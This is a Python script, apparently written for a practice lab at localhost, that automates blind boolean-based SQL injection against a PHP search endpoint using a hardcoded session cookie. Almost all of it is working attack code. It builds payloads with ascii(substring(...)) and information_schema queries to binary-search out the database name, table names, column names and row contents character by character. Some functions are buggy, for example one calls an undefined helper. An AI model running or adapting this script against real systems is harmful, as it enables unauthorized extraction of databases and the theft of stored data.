from operator import le, truediv
import requests
import time

class color:
    d='\033[00m'
    black='\033[30m'
    red='\033[31m'
    green='\033[32m'
    yellow='\033[33m'
    magenta='\033[35m'
    white='\033[37m'
    bred='\033[91m'
    bgreen='\033[92m'
    byellow='\033[93m'
    bblue='\033[94m'
    cyan='\033[96m'

url = "http://localhost/Nclass/site/search.php"
cookies={'PHPSESSID':'agm8rneppc42oj4bv3p7rlgabq'}
pay_database = "database()" # Database payload에 사용될 값
pay_table = "select table_name from information_schema.tables where table_schema=" # table payload에 사용될 값
pay_column = "select column_name from information_schema.columns where table_name=" # column payload에 사용될 값
sql_word = "hi" # 응답값을 추출하기 위한 검색 입력값
resp = "정승용" # 응답값에 포함될 값
payload1 = '''"{}' and (ascii(substring(({} '{}' limit {},1),{},1)) >{}) and '1'='1'".format(sql_word,pay_table,data_choc, seq,position,mid)+"#"'''
# opt = int(input(" 옵션 번호 지정\n"+color.byellow+" 1. All 추출 \n"+color.bblue+" 2. TEST 용 \n"))
def error(code):
    if str(code)!="200":
        print("Error : " + str(code))
        
def parameter(test):
    params ={'cate': 'title'}
    params['search'] = test
    return params

def find_database():
    flen = 0
    data_str=''
    while 1:
        flen += 1
        payload = "{}' and length({})={}".format(sql_word,pay_database,flen) +"#" #공격 쿼리 입력 후 {} 증가값 포지션 설정
        params =parameter(payload)
        response = requests.get(url, params=params, cookies=cookies)
        if (resp in response.text):  # 응답값에 포함 되어야할 문자열
            break
    # print(color.bred+"length 추출 : ",str(flen))
    for position in range(1,flen+1):
        low = 33
        high = 127
        mid=int((high+low)/2)
        while(low <= high):
            payload = "{}'and (ascii(substring(({}),{},1)) >{}) and '1'='1'".format(sql_word, pay_database,position,mid)+"#"
            params =parameter(payload)
            res = requests.get(url, params=params, cookies=cookies)
            if (resp in res.text):#참
                low = mid
            elif(resp not in res.text):#거짓
                high = mid
            if(mid+1 == high):
                mid+=1
                break
            mid=int((high+low)/2)
            
        data_str += chr(mid)
    print(color.bgreen+"Database 명 : ",data_str,color.bblue)
    error(response.status_code)
    
def payload_t(sql_word,pay_table,data_choc,seq,position,mid):
    payload_t = "{}' and (ascii(substring(({} '{}' limit {},1),{},1)) >{}) and '1'='1'".format(sql_word,pay_table,data_choc, seq,position,mid)+"#"    
    return payload_t
def find_table():
    data_choc = 'yongdata'#input("데이터베이스 명 입력 : ")
    for seq in range(0, 10):
        table_break = 0
        if(table_break == 1):
            break
        flen = 0
        data_str=''
        while 1:
            flen += 1
            payload = "{}' and length(({}'{}' limit {},1))={}".format(sql_word, pay_table, data_choc ,seq, flen) +"#" #공격 쿼리 입력 후 {} 증가값 포지션 설정
            params =parameter(payload)
            response = requests.get(url, params=params, cookies=cookies)
            if (resp in response.text):  # 응답값에 포함 되어야할 문자열
                break
            if (flen == 14):
                table_break = 1
                break
        if(table_break == 1):
            break
        # print(color.bred+"length 추출 : ",str(flen))
        for position in range(1,flen+1):
            low = 33
            high = 127
            mid=int((high+low)/2)
            while(low <= high):
                payload = payload_t(sql_word,pay_table,data_choc,seq,position,mid)
                params =parameter(payload)
                res = requests.get(url, params=params, cookies=cookies)
                if (resp in res.text):
                    low = mid
                    if(low+1 == mid):
                        break
                    elif(mid+1 == high):
                        mid += 1
                        break
                elif(resp not in res.text):
                    high = mid
                mid=int((high+low)/2)
            data_str += chr(mid)
        print(color.bblue+"Table 명 : ",data_str)
        if str(response.status_code )!="200":
            print("Error : " + str(response.status_code))
        
def find_column():
    column_choc = input(color.d+"테이블 명 입력 : ")
    for seq in range(0, 20):
        table_break = 0
        if(table_break == 1):
            break
        flen = 0
        data_str=''
        while 1:
            flen += 1
            payload = payload_column_len(sql_word, pay_column,column_choc, seq, flen)
            params =parameter(payload)
            response = requests.get(url, params=params, cookies=cookies)
            if (resp in response.text):  # 응답값에 포함 되어야할 문자열
                break
            if (flen == 14):
                table_break = 1
                break
        if(table_break == 1):
            break
        # print(color.bred+"length 추출 : ",str(flen))
        for position in range(1,flen+1):
            low = 33
            high = 127
            mid=int((high+low)/2)
            while(low <= high):
                payload = "{}' and (ascii(substring(({}'{}' limit {},1),{},1)) >{}) and '1'='1'".format(sql_word, pay_column, column_choc, seq, position, mid)+"#"
                params =parameter(payload)
                res = requests.get(url, params=params, cookies=cookies)
                if (resp in res.text):
                    low = mid
                    if(low+1 == mid):
                        break
                    elif(mid+1 == high):
                        mid += 1
                        break
                elif(resp not in res.text):
                    high = mid
                mid=int((high+low)/2)
            data_str += chr(mid)
        if str(response.status_code )!="200":
            print("Error : " + str(response.status_code))
        print(color.byellow+"Table 명 : ",data_str)
    return column_choc

def find_data():
    column_data = input(color.d+"컬럼 명 입력 :")
    for seq in range(0, 20):
        table_break = 0
        if(table_break == 1):
            break
        flen = 0
        data_str=''
        while 1:
            flen += 1
            payload = "{}' and length((select {} from {} limit {},1))={}".format(sql_word,column_data,column_choc, seq, flen) +"#"
            params =parameter(payload)
            response = requests.get(url, params=params, cookies=cookies)
            if (resp in response.text):  # 응답값에 포함 되어야할 문자열
                break
            if (flen == 14):
                table_break = 1
                break
        if(table_break == 1):
            break
        # print(color.bred+"length 추출 : ",str(flen))
        for position in range(1,flen+1):
            low = 33
            high = 127
            mid=int((high+low)/2)
            while(low <= high):
                payload = "{}' and (ascii(substring((select {} from {} limit {},1),{},1)) >{}) and '1'='1'".format(sql_word, column_data,column_choc , seq, position, mid)+"#"
                params =parameter(payload)
                res = requests.get(url, params=params, cookies=cookies)
                if (resp in res.text):
                    low = mid
                    if(low+1 == mid):
                        break
                    elif(mid+1 == high):
                        mid += 1
                        break
                elif(resp not in res.text):
                    high = mid
                mid=int((high+low)/2)
            data_str += chr(mid)
        if str(response.status_code )!="200":
            print("Error : " + str(response.status_code))
        print(color.bred+"데이터 명 : ",data_str)

if (1):    
    print(color.red+"데이터베이스+테이블명\n"+color.d+"----------------------------")
    # find_database()
    print(color.d+"----------------------------")
    find_table()
    print(color.d+"----------------------------")
    column_choc = find_column()
    print(color.d+"----------------------------")
    find_data()
else:
    find_database()
    print("error")